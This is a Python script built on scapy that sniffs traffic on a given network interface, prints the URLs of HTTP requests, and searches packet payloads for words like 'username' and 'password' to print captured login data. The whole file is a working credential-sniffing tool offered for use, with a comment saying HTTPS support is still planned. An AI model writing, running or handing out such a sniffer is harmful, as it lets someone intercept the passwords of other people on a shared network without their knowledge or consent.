#!/usr/bin/env python3

import scapy.all as scapy
from scapy.layers import http
import optparse

def get_parameters():
    parse = optparse.OptionParser()

    parse.add_option("-i", "--interface", dest="interface", help="Interface to sniff packets from.")
    (options, argument) = parse.parse_args()
    if not options.interface:
        parse.error("[-] Please specify the interface, use --help for more info.")
    return options

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet, filter="")

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "user", "login", "pass", "password"]
        for keyword in keywords:
            if keyword in load:
                return load

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url= get_url(packet)
        print("[+] HTTP Request >> "+url)

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible Username/Password >> " + login_info + "\n\n")
    #under develop need to have https request handler and few more things 
options = get_parameters()
sniff(options.interface)

